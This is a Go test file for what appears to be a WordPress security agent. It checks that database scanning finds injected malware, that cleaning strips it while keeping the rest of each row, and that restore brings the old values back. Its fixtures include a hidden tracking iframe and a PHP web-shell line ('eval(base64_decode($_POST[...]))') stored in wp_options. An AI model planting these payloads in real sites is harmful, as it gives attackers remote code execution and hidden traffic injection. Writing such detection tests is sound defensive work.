package cms

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
	"github.com/xmarthost/xmartguard/agent/internal/store"
)

// On a real MariaDB/MySQL (XG_MYSQL_TEST, same wpt database as
// TestDBChangedSinceMySQL): a scan finds the injections, the bulk clean
// cuts them out and keeps the rest of each row, a clean site embed is not
// reported, and restore puts the old value back.
func TestCleanDBFindingsMySQL(t *testing.T) {
	if os.Getenv("XG_MYSQL_TEST") == "" {
		t.Skip("set XG_MYSQL_TEST=1 with the wpt database (see TestDBChangedSinceMySQL)")
	}
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	sdb, err := store.Open()
	if err != nil {
		t.Fatal(err)
	}
	defer sdb.Close()
	st, _ := settings.Load()
	m := &Manager{DB: sdb, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}
	site := filepath.Join(dir, "public_html")
	os.MkdirAll(site, 0o755)
	os.WriteFile(filepath.Join(site, "wp-config.php"), []byte("<?php\ndefine('DB_NAME', 'wpt');\ndefine('DB_USER', 'wpu');\ndefine('DB_PASSWORD', 'wpPass_123');\ndefine('DB_HOST', 'localhost');\n$table_prefix = 'wp_';\n"), 0o644)
	c, _ := ReadWPConfig(site)
	db, err := c.Open()
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	for _, q := range []string{"DELETE FROM wp_options", "DELETE FROM wp_posts", "DELETE FROM wp_postmeta"} {
		if _, err := db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	frame := `<iframe style="position: absolute; height: 1px,width:1px; visibility: hidden;" src="//traffic.example/public"></iframe>`
	embed := `<iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; visibility: hidden;" src="https://news.example/?p=1&amp;embed=true#?secret=a" data-secret="a"></iframe>`
	payload := "<?php eval(base64_decode($_POST['x'])); ?>"
	ser := fmt.Sprintf(`a:2:{s:4:"hash";s:3:"abc";s:7:"payload";s:%d:"%s";}`, len(payload), payload)
	db.Exec(`INSERT INTO wp_posts (ID, post_content) VALUES (10, ?), (11, ?)`, "<h3>Insurance</h3>"+frame+"<p>Contact us</p>", "<p>News</p>"+embed)
	db.Exec(`INSERT INTO wp_options (option_name, option_value) VALUES ('siteurl', 'https://shop.example'), ('wp_system_state', ?), ('blogname', 'Shop')`, ser)
	if n := m.scanDB(context.Background(), Site{Path: site, User: "shop"}, true); n != 2 {
		t.Fatalf("scan found %d, want 2 (the frame and the stored payload)", n)
	}
	rows, _, _ := m.DBFindings("detected", "", 100, 0)
	var ids []int64
	for _, r := range rows {
		ids = append(ids, r.ID)
	}
	res := m.CleanDBFindings(context.Background(), ids)
	for _, r := range res {
		if !r.OK || r.Action != "cleaned" {
			t.Fatalf("clean: %+v", r)
		}
	}
	var post, opt string
	db.QueryRow(`SELECT post_content FROM wp_posts WHERE ID = 10`).Scan(&post)
	db.QueryRow(`SELECT option_value FROM wp_options WHERE option_name = 'wp_system_state'`).Scan(&opt)
	if post != "<h3>Insurance</h3><p>Contact us</p>" || opt != `a:2:{s:4:"hash";s:3:"abc";s:7:"payload";s:0:"";}` {
		t.Fatalf("after clean: %q / %q", post, opt)
	}
	if n := m.scanDB(context.Background(), Site{Path: site, User: "shop"}, true); n != 0 {
		t.Fatalf("still %d findings after the clean", n)
	}
	rows, _, _ = m.DBFindings("cleaned", "", 100, 0)
	if len(rows) != 2 || !rows[0].Restorable || !strings.Contains(rows[0].Note, "cleaned by xPGuard") {
		t.Fatalf("cleaned rows: %+v", rows)
	}
	// Restore puts the old value back; the next scan reports it again.
	for _, r := range m.RestoreDBFindings(context.Background(), ids) {
		if !r.OK {
			t.Fatalf("restore: %+v", r)
		}
	}
	db.QueryRow(`SELECT post_content FROM wp_posts WHERE ID = 10`).Scan(&post)
	if !strings.Contains(post, "traffic.example") {
		t.Fatal("old value not restored")
	}
	// Other tables and accounts are refused.
	sdb.Exec(`INSERT INTO db_findings (at, site_path, db_name, tbl, row_ref, signature, status) VALUES (1, ?, 'wpt', 'wp_users', 'ID=1', 'DB.X', 'detected')`, site)
	var bad int64
	sdb.QueryRow(`SELECT id FROM db_findings WHERE tbl = 'wp_users'`).Scan(&bad)
	if r := m.CleanDBFindings(context.Background(), []int64{bad}); r[0].OK {
		t.Fatal("a row outside options, posts and post meta was written")
	}
}
